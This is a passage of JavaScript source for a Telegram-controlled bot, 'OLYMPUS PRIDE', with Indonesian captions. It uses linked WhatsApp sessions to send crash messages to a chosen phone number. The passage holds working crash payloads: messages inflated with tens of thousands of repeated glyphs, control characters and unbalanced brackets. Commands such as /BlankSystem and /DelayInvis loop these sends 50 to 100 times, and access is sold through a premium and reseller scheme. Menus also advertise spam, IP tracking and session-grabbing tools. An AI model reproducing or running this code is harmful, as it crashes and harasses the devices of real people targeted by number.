      mimetype: "audio/ogg; codecs=opus",
      fileSha256: "5u7fWquPGEHnIsg51G9srGG5nB8PZ7KQf9hp2lWQ9Ng=",
      fileLength: "9999999999",
      seconds: 999999,
      ptt: true,
      streamingSidecar: "꧔꧈".repeat(9999)
    }
  };
  await sock.relayMessage(target, { message: CrashBload }, { messageId: callUiMsg.key.id });

  const blankContent = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 1,
              expiryTimestamp: null
            }
          },
          externalAdReply: {
            showAdAttribution: false,
            renderLargerThumbnail: true
          },
          header: {
            title: "done......",
            hasMediaAttachment: false,
            locationMessage: {
              degreesLatitude: 992.999999,
              degreesLongitude: -932.8889989,
              name: "\u900A",
              address: "\u0007".repeat(20000)
            }
          },
          body: { text: "A" },
          interactiveResponseMessage: {
            body: { text: "B", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              status: true,
              messageParamsJson: "{".repeat(5000) + "[".repeat(5000),
              paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "C",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "cyber@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(70000)}",
                "screen_0_TextInput_1": "izii Avliable. X9",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
              }`,
              version: 3
            }
          }
        }
      }
    }
  };
  const msgBlank = await generateWAMessageFromContent(target, blankContent, {});
  await sock.relayMessage(target, msgBlank.message, { messageId: msgBlank.key.id });
}
// SET SPEEDD
bot.onText(/\/setspeed (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const newSpeed = parseInt(match[1]);
  
  if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });

  if (isNaN(newSpeed) || newSpeed < 100) {
    return bot.sendMessage(chatId, "⚠️ Minimal kecepatan adalah *100ms*.", { parse_mode: "Markdown" });
  }

  globalSpeed = newSpeed;
  fs.writeFileSync(SPEED_FILE, JSON.stringify({ globalSpeed }));

  bot.sendMessage(chatId, `⚡ Kecepatan pengiriman diatur ke *${globalSpeed}ms* per loop.`, { parse_mode: "Markdown" });
  console.log(`✅ Speed diset ke ${globalSpeed}ms`);
});

bot.onText(/\/getspeed/, (msg) => {
  const chatId = msg.chat.id;
  
  if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });
  
  bot.sendMessage(chatId, `⚙️ Kecepatan saat ini: *${globalSpeed}ms* per loop.`, { parse_mode: "Markdown" });
});
// END FUNCTION SELESAI
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

const bugRequests = {};
bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
    const premiumStatus = getPremiumStatus(senderId);  
    const runtime = getBotRuntime();
    const randomImage = getRandomImage();
    
    if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });

    if (shouldIgnoreMessage(msg)) return;

    const caption = `
<blockquote>ᕙ۝━『 OLYMPUS PRIDE 』━۝ᕗ</blockquote>
<em>Ho'laa ${username} , We'lcome t'o GATE OF OLYMPUS 
I w'as creat'ed by #𝟷𝟷𝟷 ⏤𝕿𝖍𝖊𝕍𝖆𝖒𝖕𝖎𝖗𝖊 ☇ 𝗧𝖊𝖝𝖆𝖘
Pl'ease us'e th'is scrip't wi'sely</em>
<blockquote><b>♰ OLYMPUS PRIDE ♰</b></blockquote>
 ✿ Author = @Humannnceko 
 ᕙ Prefix = ( / )
 ༼ Lague = JavaScript 
 ☞ Version = V2.0
<blockquote><b>♰ ABOUT YOU ♰</b></blockquote>
 ✯ Premium = ${premiumStatus}
 ᕦ YourId = ${senderId}
 益 YourUser = ${username}
 ╬ RunTime = ${runtime}
<blockquote><em>© P'lease cli'ck th'e bu'tton be'low</em></blockquote>
    `;

    const replyMarkup = {
        inline_keyboard: [
            [
                { text: "CΗΛNΠΣL", url: "https://t.me/GateOfOlympussss" },
                { text: "ᗩUΤHΟR", url: "https://t.me/Humannnceko" }
            ],
            [
                { text: "BṲG MΣNṲ", callback_data: "trashmenu" },
                { text: "SΣTING MΣNṲ", callback_data: "setting" }
            ],
            [
                { text: "ᗪΛTΛBΛSΣ MΣNṲ", callback_data: "database" },
                { text: "GЯOᑌᑭ MΣNṲ", callback_data: "group" }
            ]
        ]
    };

    await bot.sendPhoto(chatId, randomImage, {
        caption,
        parse_mode: "HTML",
        reply_markup: replyMarkup
    });
});

// ============================ CALLBACK QUERY HANDLER ============================
bot.on("callback_query", async (query) => {
    try {
        const chatId = query.message.chat.id;
        const messageId = query.message.message_id;
        const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
        const senderId = query.from.id;
        const runtime = getBotRuntime();
        const premiumStatus = getPremiumStatus(senderId);
        const randomImage = getRandomImage();

        let caption = "";
        let replyMarkup = {};

        // -------------------- TRASH MENU --------------------
        if (query.data === "trashmenu") {
            caption = `
<blockquote>ᕙ۝━『 OLYMPUS PRIDE 』━۝ᕗ</blockquote>
<em>Ho'laa ${username} , We'lcome t'o GATE OF OLYMPUS 
I w'as creat'ed by #𝟷𝟷𝟷 ⏤𝕿𝖍𝖊𝕍𝖆𝖒𝖕𝖎𝖗𝖊 ☇ 𝗧𝖊𝖝𝖆𝖘
Pl'ease us'e th'is scrip't wi'sely</em>
<blockquote><b>♰ ABOUT YOU ♰</b></blockquote>
 ✯ Premium = ${premiumStatus}
 ᕦ YourId = ${senderId}
 益 YourUser = ${username}
 ╬ RunTime = ${runtime}      
<blockquote><b>♰ IOS CORE ♰</b></blockquote>
 ✿ /IosCrash 628××
<blockquote><b>♰ DELAY BUG ♰</b></blockquote> 
 メ /DelaysCall 628××
 ✧ /DelaysQuote 628××
 ╬ /DelayInvisible 628××
 メ /DelayInvis 628××
 ☞ /DelayEasy 628××
 ☬ /LocationBug 628×× 
<blockquote><b>♰ BLANK SYSTEM ♰</b></blockquote> 
 ✿ /BlankSystem 628××
 ╬ /BlankBug 628××
 ✧ /SystemUi 628××
 ☆ /CrashBag 628××
<blockquote><b>♰ TOLS BUG ♰</b></blockquote>
 ☬ /setspeed
 ヘ /getspeed
<blockquote><em>© P'lease cli'ck th'e bu'tton be'low</em></blockquote>
            `;
            replyMarkup = {
                inline_keyboard: [
                    [{ text: "🔙 𝑲𝑬𝑴𝑩𝑨𝑳𝑰", callback_data: "back_to_main" }]
                ]
            };
        }

        // -------------------- SETTING MENU --------------------
        if (query.data === "setting") {
            caption = `
<blockquote>ᕙ۝━『 OLYMPUS PRIDE 』━۝ᕗ</blockquote>
<em>Ho'laa ${username} , We'lcome t'o GATE OF OLYMPUS 
I w'as creat'ed by #𝟷𝟷𝟷 ⏤𝕿𝖍𝖊𝕍𝖆𝖒𝖕𝖎𝖗𝖊 ☇ 𝗧𝖊𝖝𝖆𝖘
Pl'ease us'e th'is scrip't wi'sely</em>
<blockquote><b>♰ ABOUT YOU ♰</b></blockquote>
 ✯ Premium = ${premiumStatus}
 ᕦ YourId = ${senderId}
 益 YourUser = ${username}
 ╬ RunTime = ${runtime}     
<blockquote><b>♰ AKSES MENU ♰</b></blockquote>
 ☬ /setjeda - 5m
 ヘ /addprem - id
 メ /delprem - id
 ✧ /listprem
 ╬ /addadmin - id
 ᕦ /deladmin - id
 ༼ /delsesi
 ✿ /restart
 ☞ /addbot - 62×××
<blockquote><b>♰ TOLS MENU ♰</b></blockquote>
 ✯ /switch - LinkCatbox
 ☆ /spamngl
 ☬ /nulis
 ✯ /getip ( ip suatu web )
 ᕦ /gachanomer &lt;1&gt; ( bahan ban nomer max 1 sampai 10 )
 ☞ /gachacountry &lt;1&gt; ( bahan ban nomer max 1 sampai 10 )
<blockquote><em>© P'lease cli'ck th'e bu'tton be'low</em></blockquote>
            `;
            replyMarkup = {
                inline_keyboard: [
                    [{ text: "🔙 𝑲𝑬𝑴𝑩𝑨𝑳𝑰", callback_data: "back_to_main" }]
                ]
            };
        }

        // -------------------- DATABASE MENU --------------------
        if (query.data === "database") {
            caption = `
<blockquote>ᕙ۝━『 OLYMPUS PRIDE 』━۝ᕗ</blockquote>
<em>Ho'laa ${username} , We'lcome t'o GATE OF OLYMPUS 
I w'as creat'ed by #𝟷𝟷𝟷 ⏤𝕿𝖍𝖊𝕍𝖆𝖒𝖕𝖎𝖗𝖊 ☇ 𝗧𝖊𝖝𝖆𝖘
Pl'ease us'e th'is scrip't wi'sely</em>
<blockquote><b>♰ ABOUT YOU ♰</b></blockquote>
 ✯ Premium = ${premiumStatus}
 ᕦ YourId = ${senderId}
 益 YourUser = ${username}
 ╬ RunTime = ${runtime}       
<blockquote><b>♰ DATABASE MENU ♰</b></blockquote>
 ╬ /addtoken
 益 /deltoken
 ✿ /listtoken
<blockquote><b>♰ RESELLER MENU ♰</b></blockquote>
 ᕦ /addreseller 
 ✯ /delreseller 
 ╬ /listreseller
<blockquote><b>♰ STAF MENU ♰</b></blockquote>
 ☞ /addstaf 
 ✿ /delstaf
 ᕙ /liststaf
 ༼ /info
© staf bisa open reseller ®
<blockquote><em>© P'lease cli'ck th'e bu'tton be'low</em></blockquote>
            `;
            replyMarkup = {
                inline_keyboard: [
                    [{ text: "🔙 𝑲𝑬𝑴𝑩𝑨𝑳𝑰", callback_data: "back_to_main" }]
                ]
            };
        }

        // -------------------- GROUP MENU --------------------
        if (query.data === "group") {
            caption = `
<blockquote>ᕙ۝━『 OLYMPUS PRIDE 』━۝ᕗ</blockquote>
<em>Ho'laa ${username} , We'lcome t'o GATE OF OLYMPUS 
I w'as creat'ed by #𝟷𝟷𝟷 ⏤𝕿𝖍𝖊𝕍𝖆𝖒𝖕𝖎𝖗𝖊 ☇ 𝗧𝖊𝖝𝖆𝖘
Pl'ease us'e th'is scrip't wi'sely</em>
<blockquote><b>♰ ABOUT YOU ♰</b></blockquote>
 ✯ Premium = ${premiumStatus}
 ᕦ YourId = ${senderId}
 益 YourUser = ${username}
 ╬ RunTime = ${runtime}
<blockquote><b>♰ GROUP TOLS ♰</b></blockquote>
 ╬ /demote (reply)
 益 /promote (reply)
 ✿ /opengb
 ✯ /close
 ᕙ /mute (reply)
 ༼ /unmute (reply)
 ☞ /groupAktip
 ✿ /groupNonaktif
 ╬ /addgroup
 ᕙ /delgroup
 益 /listgroup
 ╬ /add &lt;@username&gt;
 ✿ /setwelcome &lt;text&gt;
 ✯ /setleave &lt;text&gt;
 ☞ /antilink &lt;on/off&gt;
 ☞ /trackip
 ✿ /getsession
<blockquote><b>♰ CMD TOLS ♰</b></blockquote>
 ✯ /chatvampire &lt;pesan&gt;
 ᕙ /cekbio
<blockquote><em>© P'lease cli'ck th'e bu'tton be'low</em></blockquote>
            `;
            replyMarkup = {
                inline_keyboard: [
                    [{ text: "🔙 𝑲𝑬𝑴𝑩𝑨𝑳𝑰", callback_data: "back_to_main" }]
                ]
            };
        }

        // -------------------- BACK TO MAIN MENU --------------------
        if (query.data === "back_to_main") {
            caption = `
<blockquote>ᕙ۝━『 OLYMPUS PRIDE 』━۝ᕗ</blockquote>
<em>Ho'laa ${username} , We'lcome t'o GATE OF OLYMPUS 
I w'as creat'ed by #𝟷𝟷𝟷 ⏤𝕿𝖍𝖊𝕍𝖆𝖒𝖕𝖎𝖗𝖊 ☇ 𝗧𝖊𝖝𝖆𝖘
Pl'ease us'e th'is scrip't wi'sely</em>
<blockquote><b>♰ OLYMPUS PRIDE ♰</b></blockquote>
 ✿ Author = @Humannnceko 
 ᕙ Prefix = ( / )
 ༼ Lague = JavaScript 
 ☞ Version = V2.0
<blockquote><b>♰ ABOUT YO'U ♰</b></blockquote>
 ✯ Premium = ${premiumStatus}
 ᕦ YourId = ${senderId}
 益 YourUser = ${username}
 ╬ RunTime = ${runtime}
<blockquote><em>© P'lease cli'ck th'e bu'tton be'low</em></blockquote>
            `;
            replyMarkup = {
                inline_keyboard: [
                    [
                        { text: "CΗΛNΠΣL", url: "https://t.me/GateOfOlympussss" },
                        { text: "ᗩUΤHΟR", url: "https://t.me/Humannnceko" }
                    ],
                    [
                        { text: "BṲG MΣNṲ", callback_data: "trashmenu" },
                        { text: "SΣTING MΣNṲ", callback_data: "setting" }
                    ],
                    [
                        { text: "ᗪΛTΛBΛSΣ MΣNṲ", callback_data: "database" },
                        { text: "GЯOᑌᑭ MΣNṲ", callback_data: "group" }
                    ]
                ]
            };
        }

        // -------------------- SEND EDIT MESSAGE --------------------
        await bot.editMessageMedia(
            {
                type: "photo",
                media: randomImage,
                caption: caption,
                parse_mode: "HTML"
            },
            {
                chat_id: chatId,
                message_id: messageId,
                reply_markup: replyMarkup
            }
        );

        await bot.answerCallbackQuery(query.id);
    } catch (error) {
        console.error("Error handling callback query:", error);
    }
});
//==== CASE BUG
bot.onText(/\/BlankSystem (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const mention = jid;
  const target = jid;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
  if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });
   
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "ᗷΣᒪIᗩᑌ", url: AKSES_URL }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
  return bot.sendMessage(
    chatId,
    "❌ Tidak ada bot WhatsApp yang terhubung.\nGunakan /addbot 628xxx untuk menambahkan bot."
  );
}

const sessionKeys = [...sessions.keys()];
const randomKey = sessionKeys[Math.floor(Math.random() * sessionKeys.length)];
const sock = sessions.get(randomKey);

if (!sock) {
  return bot.sendMessage(
    chatId,
    "⚠️ Gagal mengambil sesi aktif. Coba ulangi /addbot lagi."
  );
}

console.log(chalk.cyan(`[SESSION] Menggunakan bot: ${randomKey}`));
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: `
\`\`\`
╔══ ✦ SPESIAL SCRIPT ✦ ══╗  
        O L Y M P U S 
╚════════════════════╝  

▢ 𝐓𝐚𝐫𝐠𝐞𝐭 𝐍𝐮𝐦𝐛𝐞𝐫 : ${formattedNumber}  
▢ 𝐓𝐨𝐭𝐚𝐥 𝐋𝐨𝐨𝐩 : 50x  
▢ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐁𝐮𝐠 : 𝑷𝒓𝒐𝒄𝒆𝒔𝒔𝒊𝒏𝒈... ⏳  

💡 𝐍𝐨𝐭𝐞:  
Setelah proses bug selesai,  
beri jeda *minimal 5 menit* agar sender  
tetap stabil dan tidak logout.
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
      for (let i = 0; i < 50; i++) {        
          await StickersAbim(target);
          await UiCallCrashBlank(sock, target);
          await sleep(globalSpeed);
          }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
╔══ ✦ SPESIAL SCRIPT ✦ ══╗  
        O L Y M P U S 
╚════════════════════╝  

▢ 𝐓𝐚𝐫𝐠𝐞𝐭 𝐍𝐮𝐦𝐛𝐞𝐫 : ${formattedNumber}  
▢ 𝐓𝐨𝐭𝐚𝐥 𝐋𝐨𝐨𝐩 : 50x  
▢ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐁𝐮𝐠 : ✅ 𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝑬𝒙𝒆𝒄𝒖𝒕𝒆𝒅  

💡 𝐍𝐨𝐭𝐞:  
Bug telah berhasil dijalankan.  
Disarankan beri jeda *5 menit* ⏳  
agar sistem tetap stabil & aman.
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `⚡ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/DelayInvisible (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const mention = jid;
  const target = jid;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
  if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });
   
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "ᗷΣᒪIᗩᑌ", url: AKSES_URL }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
  return bot.sendMessage(
    chatId,
    "❌ Tidak ada bot WhatsApp yang terhubung.\nGunakan /addbot 628xxx untuk menambahkan bot."
  );
}

const sessionKeys = [...sessions.keys()];
const randomKey = sessionKeys[Math.floor(Math.random() * sessionKeys.length)];
const sock = sessions.get(randomKey);

if (!sock) {
  return bot.sendMessage(
    chatId,
    "⚠️ Gagal mengambil sesi aktif. Coba ulangi /addbot lagi."
  );
}

console.log(chalk.cyan(`[SESSION] Menggunakan bot: ${randomKey}`));
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: `
\`\`\`
╔══ ✦ SPESIAL SCRIPT ✦ ══╗  
        O L Y M P U S 
╚════════════════════╝  

▢ 𝐓𝐚𝐫𝐠𝐞𝐭 𝐍𝐮𝐦𝐛𝐞𝐫 : ${formattedNumber}  
▢ 𝐓𝐨𝐭𝐚𝐥 𝐋𝐨𝐨𝐩 : 100x  
▢ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐁𝐮𝐠 : 𝑷𝒓𝒐𝒄𝒆𝒔𝒔𝒊𝒏𝒈... ⏳  

💡 𝐍𝐨𝐭𝐞:  
Setelah proses bug selesai,  
beri jeda *minimal 5 menit* agar sender  
tetap stabil dan tidak logout.
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
      for (let i = 0; i < 100; i++) {        
          await StickersAbim(target);
          await sleep(globalSpeed);
          }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
╔══ ✦ SPESIAL SCRIPT ✦ ══╗  
        O L Y M P U S 
╚════════════════════╝  

▢ 𝐓𝐚𝐫𝐠𝐞𝐭 𝐍𝐮𝐦𝐛𝐞𝐫 : ${formattedNumber}  
▢ 𝐓𝐨𝐭𝐚𝐥 𝐋𝐨𝐨𝐩 : 100x  
▢ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐁𝐮𝐠 : ✅ 𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝑬𝒙𝒆𝒄𝒖𝒕𝒆𝒅  

💡 𝐍𝐨𝐭𝐞:  
Bug telah berhasil dijalankan.  
Disarankan beri jeda *5 menit* ⏳  
agar sistem tetap stabil & aman.
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `⚡ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/DelayInvis (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const mention = jid;
  const target = jid;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
  if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });
   
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "ᗷΣᒪIᗩᑌ", url: AKSES_URL }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
  return bot.sendMessage(
    chatId,
    "❌ Tidak ada bot WhatsApp yang terhubung.\nGunakan /addbot 628xxx untuk menambahkan bot."
  );
}

const sessionKeys = [...sessions.keys()];
const randomKey = sessionKeys[Math.floor(Math.random() * sessionKeys.length)];
const sock = sessions.get(randomKey);

if (!sock) {
  return bot.sendMessage(
    chatId,
    "⚠️ Gagal mengambil sesi aktif. Coba ulangi /addbot lagi."
  );
}

console.log(chalk.cyan(`[SESSION] Menggunakan bot: ${randomKey}`));
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: `
\`\`\`
╔══ ✦ SPESIAL SCRIPT ✦ ══╗  
        O L Y M P U S 
╚════════════════════╝  

▢ 𝐓𝐚𝐫𝐠𝐞𝐭 𝐍𝐮𝐦𝐛𝐞𝐫 : ${formattedNumber}  
▢ 𝐓𝐨𝐭𝐚𝐥 𝐋𝐨𝐨𝐩 : 100x  
▢ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐁𝐮𝐠 : 𝑷𝒓𝒐𝒄𝒆𝒔𝒔𝒊𝒏𝒈... ⏳  

💡 𝐍𝐨𝐭𝐞:  
Setelah proses bug selesai,  
beri jeda *minimal 5 menit* agar sender  
tetap stabil dan tidak logout.
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
      for (let i = 0; i < 100; i++) {        
          await ViewOncdelay(sock, target);
          await sleep(globalSpeed);
          }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
╔══ ✦ SPESIAL SCRIPT ✦ ══╗  
        O L Y M P U S 
╚════════════════════╝  

▢ 𝐓𝐚𝐫𝐠𝐞𝐭 𝐍𝐮𝐦𝐛𝐞𝐫 : ${formattedNumber}  
▢ 𝐓𝐨𝐭𝐚𝐥 𝐋𝐨𝐨𝐩 : 100x  
▢ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐁𝐮𝐠 : ✅ 𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝑬𝒙𝒆𝒄𝒖𝒕𝒆𝒅  

💡 𝐍𝐨𝐭𝐞:  
Bug telah berhasil dijalankan.  
Disarankan beri jeda *5 menit* ⏳  
agar sistem tetap stabil & aman.
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `⚡ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/SystemUi (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const mention = jid;
  const target = jid;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
  if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });
   
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "ᗷΣᒪIᗩᑌ", url: AKSES_URL }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
  return bot.sendMessage(
    chatId,
    "❌ Tidak ada bot WhatsApp yang terhubung.\nGunakan /addbot 628xxx untuk menambahkan bot."
  );
}

const sessionKeys = [...sessions.keys()];
const randomKey = sessionKeys[Math.floor(Math.random() * sessionKeys.length)];
const sock = sessions.get(randomKey);

if (!sock) {
  return bot.sendMessage(
    chatId,
    "⚠️ Gagal mengambil sesi aktif. Coba ulangi /addbot lagi."
  );
}

console.log(chalk.cyan(`[SESSION] Menggunakan bot: ${randomKey}`));
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: `
